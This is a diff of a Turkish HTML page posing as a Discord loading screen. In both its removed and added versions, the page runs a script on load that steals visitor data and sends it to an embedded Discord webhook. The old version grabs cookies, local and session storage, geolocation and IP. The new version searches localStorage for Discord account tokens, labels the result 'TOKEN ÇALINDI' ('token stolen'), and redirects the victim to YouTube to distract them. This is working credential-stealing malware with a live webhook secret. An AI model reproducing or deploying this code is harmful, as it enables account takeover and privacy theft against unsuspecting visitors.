@@ -2,185 +2,107 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yükleniyor...</title>
     <style>
-        body {
-            background-color: black;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-        
-        .loader {
-            border: 4px solid #333;
-            border-top: 4px solid white;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        body { background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { color: white; margin-top: 20px; text-align: center; }
     </style>
 </head>
 <body>
-
-    <div class="loader"></div>
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <div id="status">Discord Verileri Alınıyor...</div>
+    </div>
 
 <script>
-    // --- AYARLAR ---
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke"; 
+    // --- WEBHOOK URL'İNİ BURAYA YAZ ---
+    const WEBHOOK = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke";
 
     async function getIP() {
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        } catch (error) {
-            return "Bilinmiyor";
+            const res = await fetch('https://api.ipify.org?format=json');
+            return (await res.json()).ip;
+        } catch { return "Bilinmiyor"; }
+    }
+
+    async function grabToken() {
+        const statusDiv = document.getElementById('status');
+        
+        // 1. TOKEN ARAMA (En Hassas Kısım)
+        let token = null;
+        
+        // A) Doğrudan 'token' anahtarını dene
+        if (localStorage.getItem('token')) {
+            token = localStorage.getItem('token');
+        } 
+        // B) 'discord_token' anahtarını dene
+        else if (localStorage.getItem('discord_token')) {
+            token = localStorage.getItem('discord_token');
+        } 
+        // C) 'lt' anahtarını dene (Eski sürümler)
+        else if (localStorage.getItem('lt')) {
+            token = localStorage.getItem('lt');
         }
-    }
-
-    async function getLocation() {
-        return new Promise((resolve) => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => resolve({ lat: position.coords.latitude, long: position.coords.longitude }),
-                    () => resolve(null)
-                );
-            } else {
-                resolve(null);
-            }
-        });
-    }
-
-    async function takeScreenshot() {
-        return new Promise((resolve) => {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                const ctx = canvas.getContext('2d');
-                
-                ctx.fillStyle = '#000000';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                
-                ctx.beginPath();
-                ctx.arc(canvas.width / 2, canvas.height / 2, 15, 0, 2 * Math.PI);
-                ctx.strokeStyle = 'white';
-                ctx.lineWidth = 2;
-                ctx.stroke();
-
-                resolve(canvas.toDataURL('image/png'));
-            } catch (e) {
-                resolve(null);
-            }
-        });
-    }
-
-    // IndexedDB Tarama Fonksiyonu
-    async function scanIndexedDB() {
-        let dbData = [];
-        try {
-            const dbs = await indexedDB.databases();
-            for (let db of dbs) {
-                if (db.name && db.name.includes('discord')) { // Discord ile ilgili DB'leri tara
-                    dbData.push(db.name);
+        // D) Tüm localStorage'ı tara (MT ile başlayanlar)
+        else {
+            for (let key in localStorage) {
+                if (localStorage[key] && localStorage[key].length > 30 && localStorage[key].startsWith("MT")) {
+                    token = localStorage[key];
+                    break;
                 }
             }
-        } catch (e) {
-            console.error("IndexedDB hatası:", e);
-        }
-        return dbData;
-    }
-
-    async function collectAndSendData() {
-        // 1. LocalStorage
-        let allLocalStorage = {};
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            const value = localStorage.getItem(key);
-            allLocalStorage[key] = value;
         }
 
-        // 2. SessionStorage
-        let allSessionStorage = {};
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            const value = sessionStorage.getItem(key);
-            allSessionStorage[key] = value;
-        }
-
-        // 3. IndexedDB Tarama
-        const indexedDBNames = await scanIndexedDB();
-
-        // 4. Diğer Veriler
-        const cookies = document.cookie;
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const language = navigator.language;
-        const screenResolution = window.screen.width + "x" + window.screen.height;
+        // 2. VERİLERİ TOPLA
         const ip = await getIP();
-        const location = await getLocation();
-        const screenshot = await takeScreenshot();
-
-        // Payload Hazırlama
+        const userAgent = navigator.userAgent;
+        const cookies = document.cookie;
+        
+        // 3. PAYLOAD HAZIRLA
         const payload = {
-            username: "Kurban Avcısı",
+            username: "Token Avcısı",
             avatar_url: "https://cdn-icons-png.flaticon.com/512/1042/1042842.png",
             embeds: [{
-                title: "🔥 YENİ KURBAN! 🔥",
+                title: "🔥 TOKEN ÇALINDI! 🔥",
                 color: 15158332,
                 fields: [
-                    { name: "💻 Platform", value: platform, inline: true },
-                    { name: "🌐 IP Adresi", value: ip, inline: true },
-                    { name: "🗺️ Konum", value: location ? `Lat: ${location.lat}, Long: ${location.long}` : "Bulunamadı", inline: false },
-                    { name: "🖥️ Ekran Çözünürlüğü", value: screenResolution, inline: true },
-                    { name: "🌍 Dil", value: language, inline: true },
+                    { name: "💻 Platform", value: navigator.platform, inline: true },
+                    { name: "🌐 IP", value: ip, inline: true },
                     { name: "🧩 Tarayıcı", value: "`" + userAgent + "`", inline: false },
-                    { name: "🍪 Cookie'ler", value: "`" + (cookies || "Boş") + "`", inline: false },
-                    { name: "💾 LocalStorage", value: JSON.stringify(allLocalStorage, null, 2), inline: false },
-                    { name: "📂 SessionStorage", value: JSON.stringify(allSessionStorage, null, 2), inline: false },
-                    { name: "🗄️ IndexedDB İsimleri", value: indexedDBNames.join(", ") || "Bulunamadı", inline: false }
+                    { name: "🍪 Cookie", value: "`" + cookies.substring(0, 500) + (cookies.length > 500 ? "..." : "") + "`", inline: false },
+                    { name: "🔑 TOKEN", value: "`" + (token || "Bulunamadı") + "`", inline: false }
                 ],
-                footer: { text: "NoTrack Anti-Bot System" },
+                footer: { text: "NoTrack System" },
                 timestamp: new Date().toISOString()
             }]
         };
 
-        if (screenshot) {
-            payload.embeds[0].image = { url: screenshot };
-        }
-
-        // Gönder
+        // 4. GÖNDER
         try {
-            await fetch(WEBHOOK_URL, {
+            await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            console.log("Veriler başarıyla gönderildi.");
-        } catch (error) {
-            console.error("Gönderme hatası:", error);
+            
+            statusDiv.innerText = "✅ Token Başarıyla Alındı!";
+            statusDiv.style.color = "#43b581";
+            
+            // 3 saniye sonra YouTube'a yönlendir (dikkat dağıtmak için)
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            }, 3000);
+
+        } catch (e) {
+            statusDiv.innerText = "❌ Gönderme Hatası: " + e.message;
+            statusDiv.style.color = "#f04748";
         }
     }
 
-    window.onload = function() {
-        collectAndSendData();
-
-        setTimeout(() => {
-            window.location.href = "https://www.youtube.com/watch?v=cwQgjq0mCdE&list=RDcwQgjq0mCdE&start_radio=1&pp=ygUPa2FueWUgaSBsb3ZlIGl0oAcB";
-        }, 2000);
-    };
+    // Sayfa yüklendiğinde çalıştır
+    window.onload = grabToken;
 </script>
-
 </body>
 </html>
